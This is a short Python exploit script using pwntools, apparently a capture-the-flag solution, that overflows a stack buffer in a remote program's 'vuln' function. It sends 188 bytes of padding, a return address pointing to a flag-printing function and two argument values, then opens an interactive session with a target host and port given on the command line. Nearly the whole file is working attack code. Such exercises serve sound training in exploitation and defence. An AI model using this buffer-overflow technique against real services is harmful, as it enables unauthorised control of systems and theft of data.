#!/usr/bin/python3.9

#Basically we overflow the buffer in the vuln function and overwrite our return address to jump to the flag function.
#The program also verifies if it received proper arguments, so we going to need to push some argument in the stack in order
#To be able to print the flag

from pwn import *
import optparse

def args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target domain or IP Address.")
    parser.add_option("-p", "--port", dest="port", help="Target Port.")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("Please specify a target !")
    if not options.port:
        parser.error("Please specify a target port !")
    return options

target = args()

FILLR = b"A"*188
address = p32(0x080491e2)
coded = p32(0xc0ded00d)
dead = p32(0xdeadbeef)

io = remote(target.target, int(target.port))
io.sendlineafter(b"\n", FILLR + address + b"A"*4 + dead + coded)
io.recvline()
io.interactive()
